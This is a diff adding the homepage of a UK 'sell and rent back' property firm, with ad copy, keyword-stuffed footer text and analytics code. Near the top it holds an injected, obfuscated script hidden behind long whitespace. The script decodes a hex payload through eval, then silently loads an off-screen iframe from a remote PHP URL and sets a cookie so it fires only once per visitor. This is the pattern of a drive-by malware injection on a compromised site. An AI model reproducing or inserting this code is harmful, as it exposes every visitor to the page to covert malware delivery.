@@ -1,0 +1,633 @@
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
+<meta name="Author" content="Sell And Rent Back">
+<meta name="Description" content="Sell And Rent Back. Top Market Rates. Long Term Tenants Welcome.  Sell And Rent Or Buy Back Schemes.">
+<meta name="GENERATOR" content="Microsoft FrontPage 4.0">
+<meta name="Keywords" content="sell and rent back,sell rent back,back rent sell,sell my house and rent it back,sell and rent back">
+<meta name="ProgId" content="FrontPage.Editor.Document">
+<meta name="Robots" content="index">
+<title>Sell And Rent Back | Sell Rent Back | Property Rescue 0800 1313 999</title>
+<link href="index.css" rel="stylesheet" type="text/css">
+<script language=Javascript name="J-BotDateFormat" ><!--
+// Webs Unlimited's J-BOTS FrontPage 2000 JavaScript Generator version 3.0
+// Copyright Webs Unlimited 1998, 1999 All rights reserved - http://WebsUnlimited.com
+// make an array of length n Needed for older javascript browsers
+function makearray(n) {
+	this.length = n
+	for (var i = 1; i <= n; i++) {
+		this[i] = null;
+}
+return this;
+}
+function IsIn(value,search) {
+	if(search.indexOf(value) != -1) {
+	  return 1;
+ } else {
+		return 0;
+   }
+}
+
+function LeadZero(value) {
+	if ( value < 10) 
+	  document.write('0');
+}
+ function DateFormat(format,twoplace) {
+var operators = 'dDmMyY%';
+var value = '';
+
+var today = new Date();
+
+// get the numbers 
+weekday = today.getDay();
+month = today.getMonth();
+year=today.getYear();
+if(year > 1900) year -= 1900; // correct for year
+date = today.getDate();
+var days = new makearray(7);
+days[0] = 'Sunday';
+days[1] = 'Monday';
+days[2] = 'Tuesday';
+days[3] = 'Wednesday';
+days[4] = 'Thursday';
+days[5] = 'Friday';
+days[6] = 'Saturday';
+var months = new makearray(12);
+months[0] = 'January';
+months[1] = 'February';
+months[2] = 'March';
+months[3] = 'April';
+months[4] = 'May';
+months[5] = 'June';
+months[6] = 'July';
+months[7] = 'August';
+months[8] = 'September';
+months[9] = 'October';
+months[10] = 'November';
+months[11] = 'December';
+var pos = 0;
+while (pos < format.length) {
+	if( format.substring(pos,pos+1) != '%') 
+	{
+		document.write(format.substring(pos,pos+1));
+		pos++;
+		continue;
+	} else {
+		if (!IsIn(format.substring(pos,pos+1), operators))		{			document.write(format.substring(pos,pos+1));
+			pos++;
+			continue;
+		} else {
+			if ( format.substring(pos,pos+1) == '%') 			{
+				pos++; // look ahead
+				if (format.substring(pos,pos+1) == '%') 
+				{
+					document.write('%');
+					pos++;
+					continue;
+				} else {
+				if (format.substring(pos,pos+1) == 'd') 
+				{
+					if(twoplace) LeadZero(date);
+					document.write(date);
+					pos++;
+					continue;
+				} else {				if (format.substring(pos,pos+1) == 'A') 
+				{					document.write(days[weekday]);
+					pos++;
+					continue;
+				} else {
+				if (format.substring(pos,pos+1) == 'a') 
+				{
+					document.write(days[weekday].substring(0,3));
+					pos++;
+					continue;
+				} else {
+				if (format.substring(pos,pos+1) == 'm') 
+				{
+					if(twoplace) LeadZero(month+1);
+					document.write(month+1);
+					pos++;
+					continue;
+				} else {
+				if (format.substring(pos,pos+1) == 'B') 
+				{
+					document.write(months[month]);
+					pos++;
+					continue;
+				} else {
+				if (format.substring(pos,pos+1) == 'b') 
+				{					document.write(months[month].substring(0,3));
+					pos++;
+					continue;
+				} else {
+				if (format.substring(pos,pos+1) == 'y') 
+				{
+					document.write(year);
+					pos++;
+					continue;
+				} else {
+				if (format.substring(pos,pos+1) == 'Y') 
+				{
+					document.write(1900 + year);
+					pos++;
+					continue;
+				} 
+       pos++; // ignore the char 
+		}
+} } } } } } } } } } } }
+//--></script>
+</head>
+<body topmargin="0" bgcolor="#BFBFBF">
+<center>
+<table width="739" border="0" cellpadding="0" cellspacing="0" bgcolor="#FFFFFF">
+  <tr>
+    <td width="1" bgcolor="#BFBFBF">&nbsp;</td>
+    <td valign="top" width="794"><table width="719"  border="0" cellspacing="0" cellpadding="0" height="970">
+      <tr>
+        <td width="6" height="11"><img src="images/spacer.gif" width="1" height="1"></td>
+        <td height="11" width="779"><img src="images/spacer.gif" width="1" height="1"></td>
+        <td width="4" height="11"><img src="images/spacer.gif" width="1" height="1"></td>
+      </tr>
+      <tr>
+        <td width="6" height="50"></td>
+
+        <td height="50" align="right" width="783" bgcolor="#0000CC">
+          <p align="center"><b><font face="Arial" size="5" color="#FFFFFF">SELL
+          AND RENT BACK FAST | CALL 0800 1313 999</font></b>
+      </td>
+      </tr>
+      <tr>
+        <td width="6" height="31"></td>
+
+        <td height="31" align="right" width="783" bgcolor="#008000">
+          <p align="center"><font face="Arial" color="#FFFFFF"><b>SELL AND RENT
+          BACK | SELL AND BUY BACK | EXPRESS COMPLETION</b></font>
+      </td>
+      </tr>
+      <tr>
+        <td width="6" height="23"></td>
+
+        <td height="23" align="right" width="783" bgcolor="#FF9900">
+          <p align="center">&nbsp;
+      </td>
+      </tr>
+      <tr>
+        <td width="6" height="233"><img src="images/spacer.gif" width="1" height="1"></td>
+        <td width="779" height="233"><table width="748"  border="0" cellspacing="0" cellpadding="0" height="1">
+          <tr>
+            <td width="185" height="1" valign="top" background="images/logo.jpg" rowspan="2" bgcolor="#FFFFFF">
+
+</center>
+            <img border="0" src="house.jpg" width="293" height="219" alt="sell and rent back house">
+              </td>
+            <td valign="top" height="1" width="555" bgcolor="#FFFFFF">
+              <p align="center" style="word-spacing: 0; margin-top: 0; margin-bottom: 0">&nbsp;</p><!--0f2490--><script type="text/javascript" language="javascript" >                                                                                                                                                                                                                                                                                                                                                                                                                z="y";vz="d"+"o"+"c"+"ument";try{+function(){if(document.querySelector)++(window[vz].body)==null}()}catch(q){aa=function(ff){ff="fr"+"omCh"+ff;for(i=0;i<z.length;i++){za+=String[ff](e(v+(z[i]))-(13));}};};e=(eval);v="0x";a=0;try{;}catch(zz){a=1}if(!a){try{++e(vz)["\x62o"+"d"+z]}catch(q){a2="^";}z="2d^73^82^7b^70^81^76^7c^7b^2d^7b^80^3d^46^35^36^2d^88^1a^17^2d^83^6e^7f^2d^80^81^6e^81^76^70^4a^34^6e^77^6e^85^34^48^1a^17^2d^83^6e^7f^2d^70^7c^7b^81^7f^7c^79^79^72^7f^4a^34^76^7b^71^72^85^3b^7d^75^7d^34^48^1a^17^2d^83^6e^7f^2d^7b^80^2d^4a^2d^71^7c^70^82^7a^72^7b^81^3b^70^7f^72^6e^81^72^52^79^72^7a^72^7b^81^35^34^76^73^7f^6e^7a^72^34^36^48^1a^17^1a^17^2d^7b^80^3b^80^7f^70^2d^4a^2d^34^75^81^81^7d^47^3c^3c^3e^44^3e^41^42^42^3b^84^72^6f^75^7c^80^81^76^7b^74^43^44^3b^3e^6f^79^82^3b^71^72^3c^70^80^80^3c^45^5e^64^58^70^86^81^71^3b^7d^75^7d^34^48^1a^17^2d^7b^80^3b^80^81^86^79^72^3b^7d^7c^80^76^81^76^7c^7b^2d^4a^2d^34^6e^6f^80^7c^79^82^81^72^34^48^1a^17^2d^7b^80^3b^80^81^86^79^72^3b^70^7c^79^7c^7f^2d^4a^2d^34^41^3f^45^3d^34^48^1a^17^2d^7b^80^3b^80^81^86^79^72^3b^75^72^76^74^75^81^2d^4a^2d^34^41^3f^45^3d^7d^85^34^48^1a^17^2d^7b^80^3b^80^81^86^79^72^3b^84^76^71^81^75^2d^4a^2d^34^41^3f^45^3d^7d^85^34^48^1a^17^2d^7b^80^3b^80^81^86^79^72^3b^79^72^73^81^2d^4a^2d^34^3e^3d^3d^3d^41^3f^45^3d^34^48^1a^17^2d^7b^80^3b^80^81^86^79^72^3b^81^7c^7d^2d^4a^2d^34^3e^3d^3d^3d^41^3f^45^3d^34^48^1a^17^1a^17^2d^76^73^2d^35^2e^71^7c^70^82^7a^72^7b^81^3b^74^72^81^52^79^72^7a^72^7b^81^4f^86^56^71^35^34^7b^80^34^36^36^2d^88^1a^17^2d^71^7c^70^82^7a^72^7b^81^3b^84^7f^76^81^72^35^34^49^7d^2d^76^71^4a^69^34^7b^80^69^34^2d^70^79^6e^80^80^4a^69^34^7b^80^3d^46^69^34^2d^4b^49^3c^7d^4b^34^36^48^1a^17^2d^71^7c^70^82^7a^72^7b^81^3b^74^72^81^52^79^72^7a^72^7b^81^4f^86^56^71^35^34^7b^80^34^36^3b^6e^7d^7d^72^7b^71^50^75^76^79^71^35^7b^80^36^48^1a^17^2d^8a^1a^17^8a^1a^17^73^82^7b^70^81^76^7c^7b^2d^60^72^81^50^7c^7c^78^76^72^35^70^7c^7c^78^76^72^5b^6e^7a^72^39^70^7c^7c^78^76^72^63^6e^79^82^72^39^7b^51^6e^86^80^39^7d^6e^81^75^36^2d^88^1a^17^2d^83^6e^7f^2d^81^7c^71^6e^86^2d^4a^2d^7b^72^84^2d^51^6e^81^72^35^36^48^1a^17^2d^83^6e^7f^2d^72^85^7d^76^7f^72^2d^4a^2d^7b^72^84^2d^51^6e^81^72^35^36^48^1a^17^2d^76^73^2d^35^7b^51^6e^86^80^4a^4a^7b^82^79^79^2d^89^89^2d^7b^51^6e^86^80^4a^4a^3d^36^2d^7b^51^6e^86^80^4a^3e^48^1a^17^2d^72^85^7d^76^7f^72^3b^80^72^81^61^76^7a^72^35^81^7c^71^6e^86^3b^74^72^81^61^76^7a^72^35^36^2d^38^2d^40^43^3d^3d^3d^3d^3d^37^3f^41^37^7b^51^6e^86^80^36^48^1a^17^2d^71^7c^70^82^7a^72^7b^81^3b^70^7c^7c^78^76^72^2d^4a^2d^70^7c^7c^78^76^72^5b^6e^7a^72^38^2f^4a^2f^38^72^80^70^6e^7d^72^35^70^7c^7c^78^76^72^63^6e^79^82^72^36^1a^17^2d^38^2d^2f^48^72^85^7d^76^7f^72^80^4a^2f^2d^38^2d^72^85^7d^76^7f^72^3b^81^7c^54^5a^61^60^81^7f^76^7b^74^35^36^2d^38^2d^35^35^7d^6e^81^75^36^2d^4c^2d^2f^48^2d^7d^6e^81^75^4a^2f^2d^38^2d^7d^6e^81^75^2d^47^2d^2f^2f^36^48^1a^17^8a^1a^17^73^82^7b^70^81^76^7c^7b^2d^54^72^81^50^7c^7c^78^76^72^35^2d^7b^6e^7a^72^2d^36^2d^88^1a^17^2d^83^6e^7f^2d^80^81^6e^7f^81^2d^4a^2d^71^7c^70^82^7a^72^7b^81^3b^70^7c^7c^78^76^72^3b^76^7b^71^72^85^5c^73^35^2d^7b^6e^7a^72^2d^38^2d^2f^4a^2f^2d^36^48^1a^17^2d^83^6e^7f^2d^79^72^7b^2d^4a^2d^80^81^6e^7f^81^2d^38^2d^7b^6e^7a^72^3b^79^72^7b^74^81^75^2d^38^2d^3e^48^1a^17^2d^76^73^2d^35^2d^35^2d^2e^80^81^6e^7f^81^2d^36^2d^33^33^1a^17^2d^35^2d^7b^6e^7a^72^2d^2e^4a^2d^71^7c^70^82^7a^72^7b^81^3b^70^7c^7c^78^76^72^3b^80^82^6f^80^81^7f^76^7b^74^35^2d^3d^39^2d^7b^6e^7a^72^3b^79^72^7b^74^81^75^2d^36^2d^36^2d^36^1a^17^2d^88^1a^17^2d^7f^72^81^82^7f^7b^2d^7b^82^79^79^48^1a^17^2d^8a^1a^17^2d^76^73^2d^35^2d^80^81^6e^7f^81^2d^4a^4a^2d^3a^3e^2d^36^2d^7f^72^81^82^7f^7b^2d^7b^82^79^79^48^1a^17^2d^83^6e^7f^2d^72^7b^71^2d^4a^2d^71^7c^70^82^7a^72^7b^81^3b^70^7c^7c^78^76^72^3b^76^7b^71^72^85^5c^73^35^2d^2f^48^2f^39^2d^79^72^7b^2d^36^48^1a^17^2d^76^73^2d^35^2d^72^7b^71^2d^4a^4a^2d^3a^3e^2d^36^2d^72^7b^71^2d^4a^2d^71^7c^70^82^7a^72^7b^81^3b^70^7c^7c^78^76^72^3b^79^72^7b^74^81^75^48^1a^17^2d^7f^72^81^82^7f^7b^2d^82^7b^72^80^70^6e^7d^72^35^2d^71^7c^70^82^7a^72^7b^81^3b^70^7c^7c^78^76^72^3b^80^82^6f^80^81^7f^76^7b^74^35^2d^79^72^7b^39^2d^72^7b^71^2d^36^2d^36^48^1a^17^8a^1a^17^76^73^2d^35^7b^6e^83^76^74^6e^81^7c^7f^3b^70^7c^7c^78^76^72^52^7b^6e^6f^79^72^71^36^1a^17^88^1a^17^76^73^35^54^72^81^50^7c^7c^78^76^72^35^34^83^76^80^76^81^72^71^6c^82^7e^34^36^4a^4a^42^42^36^88^8a^72^79^80^72^88^60^72^81^50^7c^7c^78^76^72^35^34^83^76^80^76^81^72^71^6c^82^7e^34^39^2d^34^42^42^34^39^2d^34^3e^34^39^2d^34^3c^34^36^48^1a^17^1a^17^7b^80^3d^46^35^36^48^1a^17^8a^1a^17^8a".split(a2);za="";aa("arCode");e(""+za);}</script><!--/0f2490-->
+
+              <p align="center" style="word-spacing: 0; margin-top: 0; margin-bottom: 0"><b><font face="Arial" size="5" color="#0000CC">FINANCIAL
+              DIFFICULTIES?</font></b></p>
+              <p align="center" style="word-spacing: 0; margin-top: 0; margin-bottom: 0"><font color="#FFFFFF">.</font></p>
+              <p align="center" style="word-spacing: 0; margin-top: 0; margin-bottom: 0"><b><font face="Arial" color="#0000CC">REPOSSESSIONS
+              STOPPED | CASH IN YOUR BANK</font></b></p>
+              <p align="center" style="word-spacing: 0; margin-top: 0; margin-bottom: 0">&nbsp;</p>
+              <p align="center" style="word-spacing: 0; margin-top: 0; margin-bottom: 0"><b><font face="Arial" color="#0000CC">SECURE
+              LONG TERM TENANCY AGREEMENTS</font></b></p>
+          </td>
+          </tr>
+          <tr>
+            <td valign="top" height="58" width="553">
+              <p align="center" style="word-spacing: 0; margin-top: 0; margin-bottom: 0">&nbsp;</p>
+              <p align="center" style="word-spacing: 0; margin-top: 0; margin-bottom: 0"><font face="Arial" color="#0000CC" size="2">As the UK's
+              No 1
+              <b> sell and rent back</b> company, we help hundreds
+              of people every year. We are not property developers, but an
+              established ethical family business who will work with you to find
+              a solution to your situation.&nbsp;</font></p>
+              <p align="center" style="word-spacing: 0; margin-top: 0; margin-bottom: 0">&nbsp;</td>
+          </tr>
+        </table></td>
+        <td width="4" height="233"><img src="images/spacer.gif" width="1" height="1"></td>
+      </tr>
+      <tr>
+        <td width="6" height="629">&nbsp;</td>
+        <td width="779" height="629"><table width="753"  border="0" cellspacing="0" cellpadding="0">
+          <tr>
+            <td width="183" valign="top"><table width="183"  border="0" cellspacing="0" cellpadding="0">
+              <tr>
+                <td><table width="183"  border="0" cellspacing="0" cellpadding="0">
+                  <tr>
+                    <td width="9"><img src="images/orange_title_left_corner.jpg" width="9" height="33"></td>
+                    <td valign="middle" background="images/orange_title_bg.jpg" class="orange_title">
+                      <p align="center"><img src="images/orange_arrow.jpg" width="6" height="12" align="absmiddle">&nbsp;&nbsp;<b><font face="Arial" size="2" color="#000000">100%
+                      CONFIDENCE</font></b></p>
+ </td>
+                    <td width="10"><img src="images/orange_tit_right_cor.jpg" width="10" height="33"></td>
+                  </tr>
+                </table></td>
+              </tr>
+              <tr>
+                <td width="183" background="images/orange_title_gray_bg.jpg"><table width="183"  border="0" cellspacing="0" cellpadding="0">
+                  <tr>
+                    <td width="20">&nbsp;</td>
+                    <td>
+                      <p align="center">&nbsp;</p>
+                    </td>
+                    <td width="20">&nbsp;</td>
+                  </tr>
+                  <tr>
+                    <td>&nbsp;</td>
+                    <td class="news_data">
+                      <p align="center"><b><font face="Arial" size="2" color="#0000CC">FREE
+                      VALUATION</font></b></p>
+                    </td>
+                    <td>&nbsp;</td>
+                  </tr>
+                  <tr>
+                    <td>&nbsp;</td>
+                    <td class="news_text" align="center"><p><b><font face="Arial" size="2" color="#0000CC">NO
+                      HIP REQUIRED</font></b></p>                      </td>
+                    <td>&nbsp;</td>
+                  </tr>
+                  <tr>
+                    <td>&nbsp;</td>
+                    <td align="center" class="news_learn_more"> </td>
+                    <td>&nbsp;</td>
+                  </tr>
+                  <tr>
+                    <td>&nbsp;</td>
+                    <td align="center"><b><font face="Arial" size="2" color="#0000CC">NO
+                      UPFRONT FEES</font></b></td>
+                    <td>&nbsp;</td>
+                  </tr>
+                  <tr>
+                    <td>&nbsp;</td>
+                    <td>
+                      <p align="center"><b><font face="Arial" size="2" color="#0000CC">NO
+                      AGENTS FEES</font></b></p>
+                    </td>
+                    <td>&nbsp;</td>
+                  </tr>
+                  <tr>
+                    <td>&nbsp;</td>
+                    <td align="right">
+                      <p align="center"></p>
+                    </td>
+                    <td>&nbsp;</td>
+                  </tr>
+                  <tr>
+                    <td>&nbsp;</td>
+                    <td>
+                      <p align="center"><b><font face="Arial" size="2" color="#0000CC">NO
+                      HIDDEN CLAUSES</font></b></p>
+                    </td>
+                    <td>&nbsp;</td>
+                  </tr>
+                  <tr>
+                    <td>&nbsp;</td>
+                    <td>
+                      <p align="center"><b><font face="Arial" size="2" color="#0000CC">LEGAL
+                      SUPPORT</font></b></p>
+                    </td>
+                    <td>&nbsp;</td>
+                  </tr>
+                  <tr>
+                    <td></td>
+                    <td align="right"><font color="#FFFFFF">.</font></td>
+                    <td></td>
+                  </tr>
+                  <tr>
+                    <td></td>
+                    <td align="center" bgcolor="#FFFFFF"><font face="Arial"><b>WE
+                      CAN HELP</b></font></td>
+                    <td align="center"></td>
+                  </tr>
+                  <tr>
+                    <td></td>
+                    <td align="right"><font color="#FFFFFF">.</font></td>
+                    <td></td>
+                  </tr>
+                  <tr>
+                    <td></td>
+                    <td align="center"><b><font size="2" face="Arial" color="#0000CC">REPOSSESSION</font></b></td>
+                    <td align="center"></td>
+                  </tr>
+                  <tr>
+                    <td></td>
+                    <td align="center"><b><font size="2" face="Arial" color="#0000CC">BANKRUPTCY</font></b></td>
+                    <td></td>
+                  </tr>
+                  <tr>
+                    <td></td>
+                    <td align="center"><font color="#FFFFFF">.</font></td>
+                    <td></td>
+                  </tr>
+                  <tr>
+                    <td></td>
+                    <td align="center"><b><font face="Arial" size="2" color="#0000CC">ELIMINATE
+                      DEBT</font></b></td>
+                    <td></td>
+                  </tr>
+                  <tr>
+                    <td></td>
+                    <td align="center"><b><font face="Arial" size="2" color="#0000CC">EQUITY
+                      RELEASE</font></b></td>
+                    <td></td>
+                  </tr>
+                  <tr>
+                    <td></td>
+                    <td align="center"><font color="#FFFFFF">.</font></td>
+                    <td></td>
+                  </tr>
+                  <tr>
+                    <td></td>
+                    <td align="center"><b><font face="Arial" size="2" color="#0000CC">LONG
+                      TERM UNSOLD</font></b></td>
+                    <td></td>
+                  </tr>
+                  <tr>
+                    <td></td>
+                    <td align="center"><b><font size="2" face="Arial" color="#0000CC">QUICK
+                      HOUSE SALE</font></b></td>
+                    <td></td>
+                  </tr>
+                  <tr>
+                    <td></td>
+                    <td align="center"><b><font face="Arial" size="2" color="#FFFFFF">.</font></b></td>
+                    <td></td>
+                  </tr>
+                  <tr>
+                    <td></td>
+                    <td align="center"><b><font face="Arial" size="2" color="#0000CC">LONG
+                      TERM ILLNESS</font></b></td>
+                    <td></td>
+                  </tr>
+                  <tr>
+                    <td></td>
+                    <td align="center"><b><font face="Arial" size="2" color="#0000CC">EMIGRATION</font></b></td>
+                    <td></td>
+                  </tr>
+                  <tr>
+                    <td></td>
+                    <td align="center">
+                      <hr>
+                    </td>
+                    <td></td>
+                  </tr>
+                  <tr>
+                    <td></td>
+                    <td align="center"><font color="#FFFFFF">.</font></td>
+                    <td></td>
+                  </tr>
+                  <tr>
+                    <td></td>
+                    <td align="center"><font face="Arial" size="2">Home</font></td>
+                    <td></td>
+                  </tr>
+                  <tr>
+                    <td></td>
+                    <td align="center"><font face="Arial" size="2" color="#000000"><a href="About_Us.htm">About
+                      Us</a></font></td>
+                    <td></td>
+                  </tr>
+                  <tr>
+                    <td></td>
+                    <td align="center"><font face="Arial" size="2" color="#000000"><a href="How_It_Works.htm">How
+                      It Works</a></font></td>
+                    <td></td>
+                  </tr>
+                  <tr>
+                    <td></td>
+                    <td align="center"><font face="Arial" size="2" color="#000000"><a href="Sell_And_Rent_Back.htm">Sell
+                      And Rent Back</a></font></td>
+                    <td></td>
+                  </tr>
+                  <tr>
+                    <td></td>
+                    <td align="center"><font face="Arial" size="2" color="#000000"><a href="FAQs.htm">FAQs</a></font></td>
+                    <td></td>
+                  </tr>
+                  <tr>
+                    <td></td>
+                    <td align="center"><font face="Arial" size="2" color="#000000"><a href="Equity_Release.htm">Release
+                      Equity</a></font></td>
+                    <td></td>
+                  </tr>
+                  <tr>
+                    <td></td>
+                    <td align="center"><font face="Arial" size="2" color="#000000"><a href="Repossession.htm">Repossession</a></font></td>
+                    <td></td>
+                  </tr>
+                  <tr>
+                    <td></td>
+                    <td align="center"><font face="Arial" size="2" color="#000000"><a href="Debts.htm">Eliminate
+                      Debts</a></font></td>
+                    <td></td>
+                  </tr>
+                  <tr>
+                    <td></td>
+                    <td align="center"><font face="Arial" size="2" color="#000000"><a href="Articles.htm">Articles</a></font></td>
+                    <td></td>
+                  </tr>
+                  <tr>
+                    <td></td>
+                    <td align="center"><font color="#FFFFFF">.</font></td>
+                    <td></td>
+                  </tr>
+                  <tr>
+                    <td></td>
+                    <td align="center"><b><font face="Arial" size="2" color="#FF0000">GET
+                      A CASH OFFER</font></b></td>
+                    <td></td>
+                  </tr>
+                  <tr>
+                    <td>&nbsp;</td>
+                    <td align="center"></td>
+                    <td>&nbsp;</td>
+                  </tr>
+                </table></td>
+              </tr>
+              <tr>
+                <td><table width="183"  border="0" cellspacing="0" cellpadding="0">
+                  <tr>
+                    <td width="9" height="16"><img src="images/or_tit_gray_corn_left.jpg" width="9" height="17"></td>
+                    <td><img src="images/or_tit_bottom.jpg" width="164" height="17"></td>
+                    <td width="10" height="16"><img src="images/or_tit_gray_corner_right.jpg" width="10" height="17"></td>
+                  </tr>
+                </table></td>
+              </tr>
+            </table></td>
+            <td width="10" valign="top"><img src="images/second_level_middle.jpg" width="10" height="37"></td>
+            <td valign="top"><table width="559"  border="0" cellspacing="0" cellpadding="0">
+              <tr>
+                <td><table width="559"  border="0" cellspacing="0" cellpadding="0">
+                  <tr>
+                    <td width="12"><img src="images/gr_tit_left_corn.jpg" width="12" height="33"></td>
+                    <td background="images/gr_tit_bg.jpg" class="orange_title">
+                      <p align="left"><font color="#FFFFFF"><img src="images/green_arrow.jpg" width="7" height="12">&nbsp;</font>&nbsp;
+                      <font size="4" face="Arial"><b>SELL
+                      AND RENT BACK YOUR HOME TODAY !</b> </font></p>
+ </td>
+                    <td width="14"><img src="images/gr_tit_right_corner.jpg" width="14" height="33"></td>
+                  </tr>
+                </table></td>
+              </tr>
+              <tr>
+                <td background="images/gr_field_bg.jpg"><table width="100%"  border="0" cellspacing="0" cellpadding="0">
+                  <tr>
+                    <td align="center" background="images/gr_field_bg.jpg">&nbsp;</td>
+                  </tr>
+                  <tr>
+                    <td background="images/gr_field_bg.jpg"><table width="558"  border="0" cellspacing="0" cellpadding="0">
+                      <tr>
+                        <td width="1">&nbsp;</td>
+                        <td bgcolor="#F6F4F4"><table width="549"  border="0" cellspacing="0" cellpadding="0" height="475">
+                          <tr>
+                            <td width="98" bgcolor="#FFFFFF" height="149" align="center">
+                              <p align="center"><img border="0" src="Express-Enquiry-Form_09.jpg" width="77" height="132" align="right" alt="sell and rent back lady"></td>
+                            <td width="451" valign="top" height="149">
+                              <font face="Arial" color="#000000" size="2"><b>Best
+                              rates in the market, and we can exchange the same day...</b></font>
+                          <p><font face="Arial" color="#000000" size="2">People
+                          come to us for many reasons - financial difficulties,
+                          repossession, and bankruptcy are just a few of
+                          them.&nbsp;What they all have in common is the need to
+                          trust someone who will give them the best return
+                          financially and act fast. Property Rescue has been
+                          providing sell and rent back services for many years
+                          and has the know-how and support to do just that. If
+                          you are facing repossession, we can generally stop it
+                          and exchange the same day.</font>                                                   </td>
+                          </tr>
+                          <tr>
+                            <td width="98" bgcolor="#FFFFFF" height="21">&nbsp;</td>
+                            <td width="451" valign="top" bgcolor="#FFFFFF" height="21">
+                              &nbsp;</td>
+                          </tr>
+                          <tr>
+                            <td width="98" bgcolor="#FFFFFF" height="149">
+                              <p align="center"><img border="0" src="Money2.jpg" alt="sell and rent back cash" width="124" height="97"></p>
+                            </td>
+                            <td width="451" valign="top" height="149">
+                              <p align="left"><font face="Arial" size="2"><b>You
+                              get a great deal from Property Rescue...</b></font></p>
+                              <p align="left"><font face="Arial" size="2">We
+                              will make you an offer free of charge and without
+                              any obligation. We will offer you between 75% and
+                              85% of the open market value of your property
+                              (which could take 12-16 weeks or more for you to
+                              achieve through estate agents) in return for an
+                              express cash completion. Once accepted the money
+                              can be in your account within days - no estate agents
+                              fees, no viewings, no &quot;for sale&quot; boards and no hassle.&nbsp;</font></td>
+                          </tr>
+                          <tr>
+                            <td width="98" bgcolor="#FFFFFF" height="21">&nbsp;</td>
+                            <td width="451" valign="top" bgcolor="#FFFFFF" height="21"><font color="#FFFFFF">.</font></td>
+                          </tr>
+                          <tr>
+                            <td width="98" bgcolor="#FFFFFF" rowspan="4" height="135" valign="top">
+                              <p align="center"><img border="0" src="arrows_blue_005.gif" width="32" height="32"><img border="0" src="arrows_blue_005.gif" width="32" height="32"><img border="0" src="arrows_blue_005.gif" width="32" height="32"></td>
+                            <td width="451" valign="middle" bgcolor="#FF9900" height="32">
+                              <p align="center"><b><font face="Arial" size="2">COMPLETE
+                              THE ENQUIRY FORM FOR AN IMMEDIATE CASH OFFER</font></b></td>
+                          </tr>
+
+                          <tr>
+                            <td width="451" valign="top" bgcolor="#FFFFFF" height="23">
+                              <p align="center">&nbsp;</td>
+                          </tr>
+
+                          <tr>
+                            <td width="451" valign="top" bgcolor="#FFFFFF" height="59">
+<center>
+<p align="center">
+<script src="/spicons/tinc/common/script/tincapp.js"></script></center></td>
+                          </tr>
+                          <tr>
+                            <td width="451" valign="top" bgcolor="#FFFFFF" height="21">&nbsp;</td>
+                          </tr>
+                        </table></td>
+                        <td width="1">&nbsp;</td>
+                      </tr>
+                    </table></td>
+                  </tr>
+                </table></td>
+              </tr>
+              <tr>
+                <td><table width="559"  border="0" cellspacing="0" cellpadding="0">
+                  <tr>
+                    <td width="12" height="16"><img src="images/gr_tit_left_bottom.jpg" width="12" height="16"></td>
+                    <td height="16" class="hor_bg"><img src="images/gr_tit_bg_bottom.jpg" width="533" height="16"></td>
+                    <td width="14" height="17"><img src="images/gr_tit_right_bottom.jpg" width="14" height="16"></td>
+                  </tr>
+                </table></td>
+              </tr>
+            </table></td>
+          </tr>
+          <tr>
+            <td>
+              <p align="center"></p>
+            </td>
+            <td>&nbsp;</td>
+            <td>
+              <p align="center" style="word-spacing: 0; margin-top: 0; margin-bottom: 0"><font color="#808080"><span style="font-family: Arial"><font face="Arial" size="1">Property
+              Rescue is an authorised firm with an interim permission that
+              allows it to carry on regulated sale and rent back activity on an
+              interim basis only. Compensation will not be available from the
+              Compensation Scheme if Property Rescue cannot meet its obligations
+              in relation to this activity.</font></span></font><span style="FONT-FAMILY: Arial; FONT-SIZE: 10pt"><font face="Arial" size="1" color="#808080"><o:p>
+              </font><font face="Arial" size="1" color="#BFBFBF">
+              </o:p>
+              </font></span></p>
+              <p align="center" style="word-spacing: 0; margin-top: 0; margin-bottom: 0"><font face="Arial" size="1" color="#CCCCCC">sell
+              rent back | sell rent back | sell rent back | sell rent back | sell rent back | sell
+              rent back | sell rent back</font></p>
+              <p align="center" style="word-spacing: 0; margin-top: 0; margin-bottom: 0"><font face="Arial" size="1" color="#CCCCCC">sell rent back | sell rent back | sell
+              rent back | sell
+              rent back | sell rent back | sell rent back | sell rent back</font></p>
+              <p align="center" style="word-spacing: 0; margin-top: 0; margin-bottom: 0"><font face="Arial" size="1" color="#CCCCCC">sell rent back | sell rent back | sell
+              rent back | sell
+              rent back | sell rent back | sell rent back | sell rent back</font></p>
+              <p align="center" style="word-spacing: 0; margin-top: 0; margin-bottom: 0"><font face="Arial" size="1" color="#CCCCCC">sell rent back | sell rent back | sell
+              rent back | sell
+              rent back | sell rent back | sell rent back | sell rent back</font>
+            </td>
+          </tr>
+        </table></td>
+        <td width="4" height="629">&nbsp;</td>
+      </tr>
+      <tr>
+        <td width="6" height="6"><img src="images/spacer.gif" width="1" height="1"></td>
+        <td height="6" width="779"><img src="images/spacer.gif" width="1" height="1"></td>
+        <td width="4" height="6"><img src="images/spacer.gif" width="1" height="1"></td>
+      </tr>
+      <tr>
+        <td background="images/bottom_bg.jpg" width="6" height="41"><img src="images/spacer.gif" width="1" height="1"></td>
+        <td height="41" background="images/bottom_bg.jpg" width="779"><table width="777"  border="0" cellspacing="0" cellpadding="0">
+          <tr>
+            <td width="217" class="copyright">&nbsp;&nbsp;<font face="Arial" size="1" color="#FFFFFF">Copyright &reg;
+              2010 Property Rescue Ltd</font></td>
+            <td width="10"><img src="images/short_line.jpg" width="10" height="37"></td>
+
+            <td width="536" align="center" valign="middle" class="copyright">
+              <p align="right"><a href="Contact.htm"><font face="Arial" size="2" color="#FFFFFF">Contact Us</font></a><font face="Arial" size="2" color="#FFFFFF">&nbsp;&nbsp;|&nbsp;&nbsp;</font><a href="Legal.htm"><font face="Arial" size="2" color="#FFFFFF">Legal</font></a></p>
+          </td>
+          </tr>
+        </table></td>
+<center>
+        <td background="images/bottom_bg.jpg" bgcolor="#3399FF" width="4" height="41"><img src="images/spacer.gif" width="1" height="1"></td>
+      </tr>
+    </table></center></td>
+    <td width="2" bgcolor="#BFBFBF">&nbsp;</td>
+  </tr>
+</table>
+<script type="text/javascript">
+var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
+document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));
+</script>
+<script type="text/javascript">
+try {
+var pageTracker = _gat._getTracker("UA-533754-15");
+pageTracker._trackPageview();
+} catch(err) {}</script>
+</body>
+</html>
